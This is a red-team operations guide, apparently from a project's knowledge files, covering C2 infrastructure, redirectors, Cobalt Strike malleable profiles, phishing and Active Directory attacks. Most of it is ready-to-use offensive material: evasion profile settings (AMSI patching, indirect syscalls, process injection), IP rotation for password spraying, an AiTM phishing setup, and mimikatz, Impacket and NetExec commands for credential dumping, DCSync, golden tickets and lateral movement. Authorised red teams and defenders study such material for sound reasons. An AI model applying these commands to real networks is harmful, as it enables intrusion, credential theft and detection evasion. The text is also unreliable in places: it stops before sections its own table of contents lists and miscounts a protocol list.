<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->

# Red Team Infrastructure, OPSEC, and Engagement Methodology — Deep Dive

> Synthesized from: Red-Team-Infrastructure-Wiki, RedTeam-Tactics-and-Techniques,
> Red-Teaming-Toolkit, threatexpress/malleable-c2, C2concealer, RedWarden,
> fireprox, NetExec, Impacket, mimikatz, Rubeus, Certipy/Certify, BloodHound CE,
> and Bloodhound-Custom-Queries.

---

## Table of Contents

1. [Infrastructure Architecture](#1-infrastructure-architecture)
2. [Domain and Certificate Management](#2-domain-and-certificate-management)
3. [Redirector Design](#3-redirector-design)
4. [Domain Fronting and CDN Abuse](#4-domain-fronting-and-cdn-abuse)
5. [DNS over HTTPS C2](#5-dns-over-https-c2)
6. [Malleable C2 Profile Design](#6-malleable-c2-profile-design)
7. [C2 Traffic Filtering and Protection](#7-c2-traffic-filtering-and-protection)
8. [IP Rotation with Cloud Gateways](#8-ip-rotation-with-cloud-gateways)
9. [Phishing Infrastructure](#9-phishing-infrastructure)
10. [Infrastructure Automation](#10-infrastructure-automation)
11. [OPSEC Considerations](#11-opsec-considerations)
12. [Engagement Methodology](#12-engagement-methodology)
13. [Tool Usage Patterns](#13-tool-usage-patterns)
14. [BloodHound and Attack Path Analysis](#14-bloodhound-and-attack-path-analysis)
15. [Detection Opportunities](#15-detection-opportunities)

---

## 1. Infrastructure Architecture

### 1.1 Functional Segregation

The cardinal rule of red team infrastructure: **separate assets by function across
distinct hosts and providers**. Never co-locate C2, phishing, payload hosting, and
exfiltration on the same server or cloud account.

```
                    +-----------+
                    |  TARGET   |
                    +-----+-----+
                          |
           +--------------+--------------+
           |              |              |
     +-----+-----+  +----+----+  +------+------+
     | HTTP(S)    |  |  DNS    |  |   SMTP      |
     | Redirector |  | Redir.  |  |  Redirector |
     +-----+------+ +----+----+  +------+------+
           |              |              |
     +-----+------+ +----+----+  +------+------+
     | Long-haul  | | DNS C2  |  |  Phishing   |
     | C2 Server  | | Server  |  |  Server     |
     +------------+ +---------+  +-------------+
```

**Tier model:**

| Tier | Purpose | Lifespan | Burn tolerance |
|------|---------|----------|----------------|
| Tier 1 | Redirectors (HTTP, DNS, SMTP) | Ephemeral | High — designed to be replaced |
| Tier 2 | Payload hosting, short-term C2 | Days–weeks | Medium |
| Tier 3 | Long-haul C2, team servers | Engagement duration | Low — loss is costly |

### 1.2 Traffic Flow Principle

> "Always have a host between our target and our backend servers."

Redirectors sit in front of every team server. If a redirector is burned, swap it
without migrating sessions. The backend C2 IP is never exposed in DNS, logs, or
network traffic visible to the target.

### 1.3 Provider Diversification

Split infrastructure across multiple cloud providers and geographic regions:
- AWS for API Gateway IP rotation (fireprox)
- Azure for domain fronting (where still viable)
- DigitalOcean/Linode/Vultr for ephemeral redirectors
- Dedicated servers for long-haul C2

---

## 2. Domain and Certificate Management

### 2.1 Domain Acquisition

Use **expireddomains.net** to acquire pre-aged domains with existing reputation.
Filter by:
- Domain age (older = more trusted)
- Backlink count and quality
- Archive.org snapshot history (verify no malware/phishing history)
- SimilarWeb traffic scores

**Categorization checking tools:**
- **CatMyFish** — automated BlueCoat/WebPulse lookup
- **DomainHunter** — BlueCoat, IBM X-Force, Cisco Talos with OCR captcha bypass
- **AIRMASTER** — expireddomains.net + Bluecoat with OCR
- **Chameleon** — self-categorization via redirect cloning

**Check against all major categorization services:**
McAfee, Fortiguard, Symantec BlueCoat, Checkpoint, Palo Alto, Sophos, TrendMicro,
Brightcloud, Webpulse, Lightspeed Systems, SenderBase, MultiBL, MXToolBox.

**Key insight:** Finance and healthcare domains often bypass SSL inspection due to
legal/sensitivity concerns — prioritize these categories.

### 2.2 SSL/TLS Certificates

- Use **LetsEncrypt** for redirectors — free, automated, and trusted
- Never use self-signed certificates on external-facing infrastructure
- Rotate certificates independently of backend servers
- Match certificate CN/SAN to domain categorization story

```bash
# LetsEncrypt with certbot
certbot certonly --standalone -d c2.example.com
```

For Cobalt Strike keystores:
```bash
# Convert LetsEncrypt to Java keystore
openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out cert.p12 -name c2cert
keytool -importkeystore -srckeystore cert.p12 -srcstoretype pkcs12 \
  -destkeystore store.jks -deststoretype JKS
```

---

## 3. Redirector Design

### 3.1 HTTP(S) Redirectors — Apache mod_rewrite

Apache mod_rewrite provides **conditional redirection** — the most flexible option.
It inspects requests and routes legitimate C2 traffic to the backend while
redirecting everything else to a decoy site.

**Basic SSL proxy setup** (`/etc/apache2/sites-available/000-default-le-ssl.conf`):

```apache
SSLProxyEngine On
ProxyPass / https://DESTINATION_C2_URL:443/
ProxyPassReverse / https://DESTINATION_C2_URL:443/
SSLProxyCheckPeerCN off
SSLProxyCheckPeerName off
SSLProxyCheckPeerExpire off
```

**Conditional rules based on User-Agent, URI, and source IP:**

```apache
RewriteEngine On

# Block known scanners and sandboxes
RewriteCond %{HTTP_USER_AGENT} .*(curl|wget|python|scanner).* [NC,OR]
RewriteCond %{REMOTE_ADDR} ^(10\.0\.0\.) [OR]
RewriteCond %{REQUEST_URI} !^/jquery-3\.3\.1\.min\.js$
RewriteRule ^(.*)$ https://www.legitimate-site.com/ [L,R=302]

# Forward valid C2 traffic
RewriteRule ^(.*)$ https://C2_BACKEND:443%{REQUEST_URI} [P]
```

### 3.2 Nginx Redirectors

```nginx
server {
    listen 443 ssl;
    server_name c2.example.com;

    ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;

    # Only proxy valid C2 URIs
    location /jquery-3.3.1.min.js {
        proxy_pass https://C2_BACKEND:443;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }

    # Everything else goes to decoy
    location / {
        return 302 https://www.legitimate-site.com;
    }
}
```

### 3.3 DNS Redirectors

**iptables method (preferred for Cobalt Strike DNS beacons):**

```bash
iptables -I INPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination <C2_IP>:53
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1
```

**socat method (simpler but less reliable for staging):**

```bash
socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:<C2_IP>:53
```

### 3.4 SMTP Redirectors

**Sendmail** — strip server headers:
```
define(`confRECEIVED_HEADER',`by $j ($v/$Z)$?r with $r$. id $i; $b')dnl
```

**Postfix with Dovecot** — enables bidirectional phishing correspondence with
full IMAP support for monitoring target replies in real-time.

### 3.5 SSH Tunneling for NAT Traversal

When team servers are behind NAT:

```bash
# Forward ports 80 and 443 from redirector to local C2
ssh redirector_host -R *:80:localhost:80 -R *:443:localhost:443
```

Requires on redirector:
```
# /etc/ssh/sshd_config
GatewayPorts yes
AllowTcpForwarding yes
```

---

## 4. Domain Fronting and CDN Abuse

### 4.1 Concept

Domain fronting exploits the disconnect between the DNS/TLS SNI layer and the HTTP
Host header. The CDN edge server terminates TLS using the SNI domain, but routes
the request based on the Host header to a different backend.

```
Target → DNS resolves cdn.example.com → TLS SNI: cdn.example.com
                                        HTTP Host: attacker.cdn-provider.com
CDN Edge → Routes to attacker's backend based on Host header
```

**The target's proxy/firewall sees traffic to a legitimate CDN domain.**

### 4.2 Current Status (2026)

Many providers have implemented mitigations:
- **AWS CloudFront** — blocks mismatched Host headers since 2018
- **Google Cloud** — domain fronting disabled
- **Azure CDN** — partially mitigated but some configurations remain exploitable
- **Fastly, Cloudflare** — varied enforcement

**Viable alternatives:**
- Azure Functions / Azure CDN with custom domain mapping
- Legitimate cloud services as C2 channels (Microsoft Graph API via GraphStrike)
- CDN-based redirectors with proper domain registration

### 4.3 Finding Frontable Domains

Tools:
- **FindFrontableDomains** — searches for candidate domains
- Censys queries for Azure-hosted domains
- Certificate transparency log analysis

---

## 5. DNS over HTTPS C2

### 5.1 Architecture

DNS over HTTPS (DoH) C2 tunnels command-and-control traffic inside HTTPS requests
to legitimate DoH resolvers (Cloudflare 1.1.1.1, Google 8.8.8.8), making it
nearly impossible to distinguish from normal encrypted DNS traffic.

```
Beacon → HTTPS → DoH Resolver (cloudflare-dns.com)
                       ↓
              Authoritative NS (attacker-controlled)
                       ↓
                  C2 Server (decodes DNS queries)
```

**Advantages:**
- Traffic blends with legitimate DoH queries
- Encrypted end-to-end — no plaintext DNS inspection
- Bypasses DNS-layer monitoring and filtering
- Uses standard HTTPS on port 443

**Limitations:**
- Bandwidth constrained (DNS record size limits)
- Higher latency than direct HTTPS C2
- Requires attacker-controlled authoritative nameserver

### 5.2 Implementation Pattern

1. Register domain, configure NS records to attacker-controlled DNS server
2. Beacon encodes C2 data in DNS queries (TXT, AAAA, CNAME records)
3. Queries are sent via DoH to Cloudflare/Google resolver
4. Resolver forwards to attacker's authoritative NS
5. C2 server decodes queries, sends responses as DNS records

Cobalt Strike supports DNS beacons natively. For DoH wrapping, use a local
DoH proxy on the beacon host or configure beacon to query a DoH-compatible
redirector.

---

## 6. Malleable C2 Profile Design

### 6.1 Profile Structure Overview

A malleable C2 profile controls every aspect of Cobalt Strike's network indicators,
process behavior, and memory footprint.

```
┌─────────────────────────────────────┐
│           GLOBAL OPTIONS            │
│  sleeptime, jitter, useragent,      │
│  host_stage, data_jitter, pipename  │
├─────────────────────────────────────┤
│         HTTPS-CERTIFICATE           │
│  keystore or self-signed CN/O/OU    │
├─────────────────────────────────────┤
│          HTTP-CONFIG                │
│  headers, trust_x_forwarded_for,    │
│  block/allow_useragents             │
├─────────────────────────────────────┤
│    HTTP-GET / HTTP-POST BLOCKS      │
│  URIs, client/server transforms,    │
│  metadata encoding, output format   │
├─────────────────────────────────────┤
│         STAGE BLOCK                 │
│  PE header spoofing, obfuscation,   │
│  memory permissions, cleanup        │
├─────────────────────────────────────┤
│      PROCESS-INJECT BLOCK           │
│  allocator, min_alloc, rwx perms,   │
│  execution methods                  │
├─────────────────────────────────────┤
│        POST-EX BLOCK                │
│  spawnto, obfuscate, AMSI disable,  │
│  keylogger, threadhint, BOF alloc   │
└─────────────────────────────────────┘
```

### 6.2 Critical Global Options

```c
# Timing — avoid default 60s beacon interval
set sleeptime "45000";      # 45 seconds
set jitter    "37";         # 37% variance → 28-62 second range
set data_jitter "100";      # Random padding up to 100 bytes

# OPSEC: Disable staged payloads (stageless only)
set host_stage "false";

# User-Agent must match target environment
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

# Named pipes — avoid defaults
set pipename "Winsock2\\CatalogChangeListener-###-0";
set pipename_stager "mojo.5688.8052.183894939787088877##";
```

### 6.3 HTTP Communication Blocks

**Metadata transforms** — how beacon ID and session data are encoded:

| Transform | Effect | OPSEC note |
|-----------|--------|------------|
| `base64` | Standard Base64 | Detectable in headers |
| `base64url` | URL-safe Base64 | Safe for parameters/URIs |
| `mask` | XOR with random key | Adds entropy, harder to fingerprint |
| `netbios` / `netbiosu` | NetBIOS encoding | Large output, distinctive |
| `prepend "str"` | Prefix with string | Blend into expected format |
| `append "str"` | Suffix with string | Blend into expected format |

**Example HTTP-GET block mimicking jQuery CDN:**

```c
http-get {
    set uri "/jquery-3.3.1.min.js";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Referer" "https://www.example.com/";
        header "Accept-Encoding" "gzip, deflate";

        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "max-age=0, no-cache";
        header "Server" "NetDNA-cache/2.2";

        output {
            mask;
            base64;
            prepend "!function(e,t){\"use strict\";\"object\"==typeof module";
            append "\".(jQuery)\";}));";
            print;
        }
    }
}
```

**Example HTTP-POST block:**

```c
http-post {
    set uri "/api/v1/submit";
    set verb "POST";

    client {
        header "Content-Type" "application/json";

        id {
            base64url;
            parameter "sid";
        }
        output {
            mask;
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";
        output {
            mask;
            base64;
            prepend "{\"status\":\"ok\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}
```

### 6.4 Stage Block — Memory and PE Evasion

```c
stage {
    set userwx      "false";       # RX not RWX — critical for EDR evasion
    set obfuscate    "true";       # Mask PE header + text sections
    set stomppe      "true";       # Remove MZ/PE headers post-load
    set cleanup      "true";       # Free loader memory
    set name         "srv.dll";    # Spoofed export name
    set sleep_mask   "true";       # Encrypt beacon in memory during sleep

    # Syscall method (CS 4.8+) — bypass userland hooks
    set syscall_method "Indirect";

    # Spoof PE headers to look like legitimate DLL
    set compile_time   "14 Jul 2009 01:20:05";
    set image_size_x64 "512000";
    set rich_header    "\x...";    # Copy from legitimate Microsoft DLL

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90";
        strrep "ReflectiveLoader" "KernelInit";
        strrep "beacon.dll" "";
    }
}
```

### 6.5 Process Injection Block

```c
process-inject {
    set allocator  "NtMapViewOfSection";  # Avoids VirtualAllocEx hooks
    set min_alloc  "17500";               # Minimum allocation size
    set startrwx   "false";              # No initial RWX
    set userwx     "false";              # No final RWX

    transform-x64 {
        prepend "\x90\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        NtQueueApcThread-s;              # Early Bird injection
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
```

### 6.6 Post-Exploitation Block

```c
post-ex {
    # Spawn-to processes — avoid cmd.exe, powershell.exe, rundll32.exe
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";

    set obfuscate    "true";     # Scramble post-ex DLL content
    set smartinject  "true";     # Embed function pointers
    set amsi_disable "true";     # Patch AmsiScanBuffer
    set cleanup      "true";     # Clean up post-ex artifacts

    set keylogger    "GetAsyncKeyState";  # Less intrusive than SetWindowsHookEx
    set threadhint   "ntdll!RtlUserThreadStart+0x42";

    # BOF memory management
    set bof_allocator   "MapViewOfFile";
    set bof_reuse_memory "true";
}
```

### 6.7 Profile Validation

**Always lint before deployment:**
```bash
./c2lint /path/to/profile.profile
```

C2concealer automates profile generation with randomized values:
```bash
# Generate 3 HTTP variants with SSL
python3 C2concealer.py --hostname legitimate-domain.com --variant 3

# Docker deployment
docker run -it -v /opt/cobaltstrike/:/usr/share/cobaltstrike/ \
  C2concealer --hostname google.com --variant 3
```

---

## 7. C2 Traffic Filtering and Protection

### 7.1 RedWarden — Malleable Profile Enforcer

RedWarden is an HTTP/HTTPS reverse proxy that validates incoming traffic against
the malleable C2 profile specification, blocking unauthorized access.

**Capabilities:**
- Parses malleable profiles to enforce strict HTTP request contracts
- Validates URIs, headers, User-Agent, prepend/append patterns
- IP blacklisting of known security vendor ranges
- Reverse-DNS keyword matching for vendor infrastructure
- IP geolocation filtering (country, coordinates, organization)
- Replay protection via SQLite MD5 hash tracking
- Traffic repair for headers mangled by CDNs/WAFs

**Drop actions for invalid traffic:**

| Action | Behavior |
|--------|----------|
| `redirect` | Send to legitimate website (decoy) |
| `reset` | TCP RST — immediate connection kill |
| `proxy` | Fetch and serve content from legitimate site |

**Configuration example:**

```yaml
port:
  - 80/http
  - 443/https
profile: jquery-c2.4.0.profile
ssl_cacert: /etc/letsencrypt/live/c2.example.com/fullchain.pem
ssl_cakey: /etc/letsencrypt/live/c2.example.com/privkey.pem
teamserver_url:
  - 10.0.0.5:8080
drop_action: reset
ban_whitelist_ip_reload: true
policy:
  - drop_invalid_useragent: true
  - drop_banned_http_headers: true
  - malleable_contract_enforcement: true
  - ip_geolocation_requirements: true
```

### 7.2 RedGuard

Alternative C2 front-flow control tool. Validates beacon traffic and filters
analyst/sandbox connections based on configurable rules.

### 7.3 AzureC2Relay

Azure Function-based validator for Cobalt Strike beacon traffic — adds cloud-native
filtering without dedicated redirector infrastructure.

---

## 8. IP Rotation with Cloud Gateways

### 8.1 FireProx — AWS API Gateway Rotation

FireProx creates pass-through proxies via AWS API Gateway that **rotate the source
IP address with every request**. Each request to the proxy URL originates from a
different AWS IP.

**Architecture:**
```
Operator → API Gateway Proxy URL → Target
           (new IP per request)
```

**Setup:**

```bash
git clone https://github.com/ustayready/fireprox
cd fireprox
pip install -r requirements.txt

# Create proxy for target URL
python fire.py --access_key AKIAXXXXXXXXX \
               --secret_access_key XXXXXXXXXXXXXXXX \
               --region us-east-1 \
               --command create \
               --url https://login.target.com

# List active proxies
python fire.py --command list

# Delete proxy
python fire.py --command delete --api_id abc123def
```

**Use cases:**
- Password spraying without IP-based lockout
- Web reconnaissance without fingerprinting
- Phishing link delivery with diverse source IPs
- Bypassing IP-based rate limiting and WAF rules

**OPSEC warnings:**
- AWS includes originating IP in `X-Forwarded-For` header by default
- CloudFlare and similar CDNs may inspect and block X-Forwarded-For
- AWS may terminate accounts for abuse — use dedicated accounts
- Clean up API Gateway resources after engagement

### 8.2 CredMaster Integration

CredMaster combines FireProx with password spraying tools for O365, OWA, and other
authentication endpoints, automatically rotating IPs per request.

---

## 9. Phishing Infrastructure

### 9.1 Mail Server Setup

**iRedMail configuration:**
1. Set FQDN hostname matching MX record
2. Configure DNS A record for SSL certificate
3. Deploy RoundCube web interface for bidirectional communication
4. Generate DKIM keys: `amavisd-new showkeys`
5. Configure DMARC via DMARC Wizard
6. Set SPF records: `v=spf1 ip4:<SMTP_IP> -all`

### 9.2 AiTM Phishing with Evilginx

**On-premises architecture for sensitive engagements:**

```
Target Browser
      ↓
Cloudflare (DNS + WAF + cookie gating)
      ↓
Caddy Reverse Proxy (on client edge server)
      ↓ (Tailscale/Headscale VPN)
Evilginx Backend (private network, AiTM credential capture)
```

**Cloudflare cookie-gating rule:**
```
(http.host eq "portal.example.com")
and (not http.cookie contains "session_token=abc123def456")
```

This blocks automated scanners that lack the required cookie, reducing exposure
to security tools crawling phishing URLs.

**Caddy configuration:**

```caddyfile
portal.example.com {
    tls internal
    reverse_proxy https://evilginx:443 {
        transport http {
            versions 1.1
            tls_insecure_skip_verify
            tls_server_name portal.example.com
        }
        header_up Host portal.example.com
        header_up X-Forwarded-Proto https
    }
}
```

### 9.3 Phishing Frameworks

| Framework | Strength |
|-----------|----------|
| **Gophish** | Campaign management, tracking, templates |
| **Evilginx2** | AiTM for MFA bypass, session cookie theft |
| **Modlishka** | Reverse proxy phishing with real-time modification |
| **PwnAuth** | OAuth abuse campaigns |
| **SET** | Social engineering toolkit, multi-vector |

---

## 10. Infrastructure Automation

### 10.1 Terraform

Automate deployment of redirectors, C2 servers, and phishing infrastructure:

```hcl
resource "digitalocean_droplet" "redirector" {
  image  = "ubuntu-22-04-x64"
  name   = "redir-01"
  region = "nyc1"
  size   = "s-1vcpu-1gb"

  provisioner "remote-exec" {
    inline = [
      "apt-get update && apt-get install -y apache2",
      "a2enmod rewrite proxy proxy_http ssl",
      "systemctl restart apache2",
    ]
  }
}
```

**Key references:**
- Red Baron — comprehensive Terraform-based infra automation
- @_RastaMouse — Automated Red Team Infrastructure Deployment series

### 10.2 Ansible

Post-deployment configuration management:

```yaml
- name: Configure HTTP Redirector
  hosts: redirectors
  tasks:
    - name: Install Apache
      apt: name=apache2 state=present

    - name: Enable modules
      apache2_module: name={{ item }} state=present
      loop: [rewrite, proxy, proxy_http, ssl]

    - name: Deploy mod_rewrite rules
      template:
        src: redirect.rules.j2
        dest: /etc/apache2/sites-available/000-default.conf

    - name: Obtain LetsEncrypt certificate
      command: certbot certonly --apache -d {{ domain }} --non-interactive --agree-tos
```

### 10.3 Log Aggregation

**RedELK** — red team SIEM that aggregates logs across all infrastructure
components and monitors for blue team activity (IOC searches, honeypot
interactions, infrastructure probes). Alerts via Slack/email.

---

## 11. OPSEC Considerations

### 11.1 Infrastructure OPSEC Checklist

**Network layer:**
- [ ] Never expose C2 server IPs in public DNS
- [ ] All traffic flows through redirectors
- [ ] SSH access restricted by source IP (iptables)
- [ ] SSH public-key authentication only — no passwords
- [ ] Use `chattr +i /var/spool/cron` to prevent cron tampering
- [ ] Monitor all logs: SMTP, Apache, tcpdump, iptables
- [ ] High-value event alerting (new sessions, credential captures)

**Domain layer:**
- [ ] Domains pre-aged with clean reputation
- [ ] Categorization verified across all major vendors
- [ ] Short TTLs for rapid DNS rotation
- [ ] Separate domains per function (phishing, C2, payload hosting)

**TLS layer:**
- [ ] LetsEncrypt certificates (not self-signed)
- [ ] TLS fingerprint (JA3/JA3S) matches legitimate software
- [ ] Certificate rotation on redirectors independent of backend
- [ ] No default Cobalt Strike JA3 hash

**Host layer:**
- [ ] Minimal OS installation
- [ ] No unnecessary services
- [ ] Firewall rules deny all except required ports
- [ ] Regular patching
- [ ] Full disk encryption

### 11.2 C2 Channel OPSEC

**Malleable profile hardening:**
- Set `host_stage` to `false` — never serve stager payloads
- Use `sleep_mask` to encrypt beacon in memory during sleep
- Set `userwx` to `false` everywhere — no RWX memory regions
- Use indirect syscalls (`syscall_method "Indirect"`) to bypass userland hooks
- Customize `spawnto` — never use default `rundll32.exe`
- Set `obfuscate` to `true` in stage and post-ex blocks
- Randomize named pipe names
- Use `threadhint` to spoof thread start addresses

**Behavioral OPSEC:**
- Jitter should be 20-50% — pure interval beacons are detectable
- Long sleep times (>300s) for long-haul C2
- Short sleep times only during active operations
- Avoid process creation chains (beacon → cmd.exe → whoami)
- Prefer BOFs over fork-and-run for post-exploitation
- Use `inline-execute` over `execute-assembly` when possible

### 11.3 Credential OPSEC

- Never store credentials in plaintext on team servers
- Use Cobalt Strike's credential manager or encrypted vaults
- Rotate credentials after each major operation phase
- Log all credential usage with timestamps
- Delete credential artifacts from disk after extraction

---

## 12. Engagement Methodology

### 12.1 Phase 1 — Reconnaissance

**Passive OSINT:**

| Tool | Purpose |
|------|---------|
| **Amass** | Attack surface mapping, subdomain enumeration |
| **SpiderFoot** | Automated OSINT collection across data sources |
| **Recon-ng** | Modular OSINT framework |
| **linkedin2username** | Generate username lists from LinkedIn |
| **BBOT** | Recursive internet scanning |
| **cloud_enum** | AWS/Azure/GCP resource enumeration |
| **gitleaks** | Secret detection in git repositories |
| **S3Scanner** | Open S3 bucket discovery |
| **spoofcheck** | SPF/DMARC weakness identification |

**Active scanning:**

| Tool | Purpose |
|------|---------|
| **RustScan** | Fast port scanning (3-second full scans) |
| **dnscan** | DNS subdomain brute-forcing |
| **WitnessMe** | Web screenshot inventory |
| **pagodo** | Google Hacking Database automation |

### 12.2 Phase 2 — Initial Access

**Credential attacks:**
- Password spraying with **CredMaster** (FireProx IP rotation)
- **SprayingToolkit** — Lync, OWA, O365 spraying
- Brute-force with jitter and lockout awareness

**Payload delivery:**

| Tool | Technique |
|------|-----------|
| **ScareCrow** | EDR bypass payload generation |
| **Donut** | Position-independent shellcode from .NET/PE |
| **Freeze** | Suspended process + syscall-based evasion |
| **Shhhloader** | Shellcode loader with sleep encryption |
| **macro_pack** | Obfuscated Office documents |
| **EvilClippy** | Malicious Office document creation |
| **OfficePurge** | P-code removal from VBA macros |
| **ThreatCheck** | Identify AV-flagged byte sequences |
| **ProtectMyTooling** | Multi-packer daisy-chaining |
| **InvisibilityCloak** | C# tool obfuscation |

**MFA bypass:**
- **Evilginx2** — AiTM session cookie theft
- **Modlishka** — reverse proxy with real-time modification
- **PwnAuth** — OAuth phishing campaigns

### 12.3 Phase 3 — Execution and Persistence

**Execution techniques:**
- BOF (Beacon Object Files) for in-process execution
- `execute-assembly` for .NET tools (with AMSI bypass)
- Inline execution to avoid fork-and-run detection
- MSBuild execution without `MSBuild.exe` (**MSBuildAPICaller**)

**Persistence mechanisms:**
- Scheduled tasks via WMI
- DLL side-loading (**DueDLLigence**, **DllShimmer**)
- Registry run keys
- COM object hijacking
- WMI event subscriptions
- Service installation
- Golden/Diamond tickets for long-term domain access

### 12.4 Phase 4 — Privilege Escalation

| Tool | Capability |
|------|-----------|
| **PEASS (winPEAS/linPEAS)** | Automated privilege escalation enumeration |
| **SharpUp** | C# PowerUp for Windows misconfigurations |
| **Watson** | Missing KB enumeration + exploit suggestions |
| **SweetPotato** | Service account → SYSTEM via token impersonation |
| **MultiPotato** | SeImpersonate exploitation variants |
| **KrbRelayUp** | Local privilege escalation via Kerberos relay |
| **PPLKiller/PPLBlade** | LSA Protection bypass |
| **Certipy/Certify** | AD CS escalation (ESC1-ESC16) |

### 12.5 Phase 5 — Credential Access

#### 12.5.1 Mimikatz

Core modules and their capabilities:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords     # Dump plaintext passwords, hashes, tickets
mimikatz # sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd
                                         # Pass-the-hash
mimikatz # sekurlsa::tickets /export     # Export Kerberos tickets

mimikatz # lsadump::sam                  # SAM database hashes
mimikatz # lsadump::secrets              # DPAPI secrets
mimikatz # lsadump::cache                # Cached domain credentials
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local
                                         # DCSync — replicate DC data remotely

mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... \
           /krbtgt:HASH /ptt             # Golden ticket
mimikatz # kerberos::ptt ticket.kirbi    # Pass-the-ticket

mimikatz # crypto::certificates /export  # Export certificates
mimikatz # crypto::keys /export          # Export private keys

mimikatz # vault::cred                   # Windows Credential Manager
mimikatz # token::elevate                # Token privilege escalation
```

**Python alternatives:**
- **pypykatz** — pure Python mimikatz (no Windows binary needed)
- **nanodump** — BOF for LSASS minidump creation
- **SafetyKatz** — modified mimikatz with .NET PE loader
- **SharpDPAPI** — C# DPAPI functionality

#### 12.5.2 Impacket Suite

Impacket provides Python-based implementations of Windows networking protocols.
Key tools and their use cases:

| Tool | Purpose | OPSEC Note |
|------|---------|------------|
| `secretsdump.py` | Extract SAM, LSA secrets, NTDS.dit, DCSync | DCSync triggers DRS replication logs |
| `psexec.py` | Remote execution via service creation on ADMIN$ | Creates service binary — noisy |
| `smbexec.py` | Remote execution via service + cmd.exe | Uses cmd.exe — moderate noise |
| `wmiexec.py` | Remote execution via WMI | No service creation — quieter |
| `atexec.py` | Remote execution via scheduled task | Task scheduler logs |
| `dcomexec.py` | Remote execution via DCOM | Uses MMC20, ShellWindows, etc. |
| `getTGT.py` | Request TGT with password/hash/key | Kerberos authentication |
| `getST.py` | Request service ticket (S4U support) | Delegation exploitation |
| `GetNPUsers.py` | AS-REP roasting | Identifies no-preauth accounts |
| `GetUserSPNs.py` | Kerberoasting | Extracts service ticket hashes |
| `ntlmrelayx.py` | NTLM relay attacks | Multi-protocol relay |
| `smbserver.py` | Rogue SMB server | Credential capture |
| `rpcdump.py` | RPC endpoint enumeration | Recon |
| `lookupsid.py` | SID brute-forcing | User enumeration |
| `reg.py` | Remote registry operations | SAM/SYSTEM extraction |

**Authentication support:** Plain password, NTLM hash, Kerberos ticket, AES key.

**Common patterns:**

```bash
# DCSync with hash authentication
secretsdump.py -hashes :NTLMHASH corp.local/admin@DC01

# WMI execution with Kerberos
wmiexec.py -k -no-pass corp.local/admin@TARGET

# AS-REP Roasting
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Kerberoasting
GetUserSPNs.py corp.local/user:pass -request -outputfile kerberoast.txt

# NTLM relay to LDAP for RBCD
ntlmrelayx.py -t ldap://DC01 --delegate-access
```

### 12.6 Phase 6 — Lateral Movement

#### 12.6.1 NetExec (CrackMapExec successor)

NetExec supports eight protocols: **SMB, LDAP, WinRM, MSSQL, SSH, RDP, FTP, WMI, VNC**.

**Authentication methods:**
```bash
# Password authentication
nxc smb 192.168.1.0/24 -u admin -p 'Password123'

# Hash authentication (pass-the-hash)
nxc smb 192.168.1.0/24 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:NTLMHASH'

# Kerberos authentication
nxc smb 192.168.1.0/24 -u admin -p 'Password123' -k
```

**Enumeration:**
```bash
# Share enumeration
nxc smb 192.168.1.0/24 -u user -p pass --shares

# User enumeration
nxc smb DC01 -u user -p pass --users

# Group enumeration
nxc smb DC01 -u user -p pass --groups

# Password policy
nxc smb DC01 -u user -p pass --pass-pol

# Logged-on users
nxc smb 192.168.1.0/24 -u user -p pass --loggedon-users

# RID brute-force (null session)
nxc smb DC01 -u '' -p '' --rid-brute

# SMB signing check
nxc smb 192.168.1.0/24 --gen-relay-list nosigning.txt
```

**Command execution:**
```bash
# Command execution (multiple methods)
nxc smb TARGET -u admin -p pass -x 'whoami'          # cmd
nxc smb TARGET -u admin -p pass -X 'Get-Process'     # PowerShell
nxc winrm TARGET -u admin -p pass -x 'whoami'        # WinRM
nxc wmi TARGET -u admin -p pass -x 'whoami'          # WMI
```

**Password spraying with OPSEC:**
```bash
# Spray with jitter to avoid lockout
nxc smb 192.168.1.0/24 -u users.txt -p 'Spring2026!' --jitter 3-7

# No-bruteforce mode (one-to-one user:pass mapping)
nxc smb DC01 -u users.txt -p passwords.txt --no-bruteforce
```

**"Pwn3d!" output** indicates the credential has admin-level access on the target.

#### 12.6.2 Lateral Movement Techniques

| Technique | Tool | OPSEC level |
|-----------|------|-------------|
| WMI execution | wmiexec.py, NetExec WMI | High — no service creation |
| DCOM execution | dcomexec.py | High — uses legitimate COM objects |
| WinRM | evil-winrm, NetExec WinRM | Medium — requires WinRM enabled |
| PSExec | psexec.py, Cobalt Strike | Low — creates service, writes binary |
| SMBExec | smbexec.py | Medium — uses cmd.exe via service |
| Scheduled Task | atexec.py | Medium — task scheduler logs |
| Pass-the-Hash | mimikatz pth, NetExec -H | Medium — NTLM authentication |
